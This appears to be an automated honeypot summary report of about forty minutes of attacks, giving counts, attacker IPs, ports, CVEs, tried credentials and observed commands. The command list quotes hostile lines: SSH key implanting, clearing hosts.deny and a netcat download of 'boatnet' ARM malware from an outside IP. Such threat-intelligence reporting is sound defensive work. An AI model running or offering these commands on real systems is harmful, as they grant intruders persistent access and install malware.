
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-26T19:01:39Z
**Timeframe Covered:** Approximately 2025-10-26T18:20:00Z to 2025-10-26T19:00:00Z
**Log Files Used:**
- agg_log_20251026T182001Z.json
- agg_log_20251026T184001Z.json
- agg_log_20251026T190001Z.json

---

## Executive Summary

This report summarizes 28,933 malicious events captured by the honeypot network. The majority of attacks were registered by the Cowrie honeypot, indicating a high volume of SSH and Telnet brute-force attempts. The most prominent attacking IP address was 172.188.91.73, responsible for over a third of all recorded events. A significant number of attacks targeted port 5060 (Sentrypeer/VoIP) and port 22 (Cowrie/SSH). Attackers were observed attempting to add their SSH keys to compromised machines and downloading additional malware payloads. Several CVEs were also detected, including attempts to exploit vulnerabilities in PHP and Apache.

---

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 13,841
- **Sentrypeer:** 7,841
- **Honeytrap:** 2,633
- **Dionaea:** 1,780
- **Ciscoasa:** 1,363
- **Suricata:** 1,235
- **Mailoney:** 88
- **Tanner:** 61
- **Redishoneypot:** 29
- **Heralding:** 19
- **ConPot:** 16
- **Adbhoney:** 12
- **H0neytr4p:** 5
- **Honeyaml:** 5
- **ElasticPot:** 4
- **Ipphoney:** 1

### Top Attacking IPs
- 172.188.91.73 (10,168)
- 2.57.121.61 (6,602)
- 156.212.187.72 (1,422)
- 144.172.108.231 (834)
- 60.248.251.206 (302)
- 182.43.235.218 (183)
- 34.47.232.78 (458)
- 165.232.91.82 (411)
- 185.243.5.158 (280)
- 107.170.36.5 (192)

### Top Targeted Ports/Protocols
- 5060 (7,841)
- 22 (2,543)
- 445 (1,725)
- 5901 (120)
- 8333 (113)
- 5903 (110)
- 25 (88)
- TCP/22 (60)
- 23 (52)

### Most Common CVEs
- CVE-1999-0183
- CVE-2002-0012
- CVE-2002-0013
- CVE-2002-0953
- CVE-2005-4050
- CVE-2018-10561
- CVE-2018-10562
- CVE-2021-41773
- CVE-2021-42013
- CVE-2024-4577

### Commands Attempted by Attackers
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `lockr -ia .ssh`
- `cat /proc/cpuinfo | grep name | wc -l`
- `uname -a`
- `whoami`
- `crontab -l`
- `w`
- `top`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
- `cd /data/local/tmp; ... toybox nc 84.200.81.239 2228 > boatnet.arm7; ...`

### Signatures Triggered
- ET DROP Dshield Block Listed Source group 1 (329)
- ET SCAN NMAP -sS window 1024 (135)
- ET SCAN MS Terminal Server Traffic on Non-standard Port (101)
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source) (42)
- ET INFO Reserved Internal IP Traffic (46)

### Users / Login Attempts
- 345gs5662d34/345gs5662d34 (16)
- root/3245gs5662d34 (8)
- ubuntu/tizi@123 (4)
- Various combinations for `root`, `admin`, `user`, `test`, and other common usernames.

### Files Uploaded/Downloaded
- `sh`
- `a>`
- `Help:Contents`
- `gpon8080&ipv=0`

### HTTP User-Agents
- No user agents recorded in this period.

### SSH Clients and Servers
- No specific SSH client or server versions recorded in this period.

### Top Attacker AS Organizations
- No AS organization data recorded in this period.

---

## Key Observations and Anomalies

1.  **High Volume of VoIP Scans:** The Sentrypeer honeypot recorded a large number of events on port 5060, suggesting widespread scanning for vulnerabilities in VoIP systems.
2.  **Persistent SSH Key Insertion:** A recurring command across multiple sessions and IPs attempts to add a specific SSH public key (`...mdrfckr`) to the `authorized_keys` file. This indicates a coordinated campaign to maintain persistent access to compromised systems.
3.  **Malware Download Attempts:** An interesting command was observed attempting to use `toybox nc` (netcat) to download several ARM-based malware payloads (`boatnet.arm`, `boatnet.arm5`, `boatnet.arm6`, `boatnet.arm7`) from the IP `84.200.81.239`. This is indicative of attackers targeting IoT or embedded devices.
4.  **CVE-2024-4577 Exploitation:** The logs show multiple attempts to exploit CVE-2024-4577, a critical PHP vulnerability. This highlights that attackers are actively targeting recent and high-impact vulnerabilities.
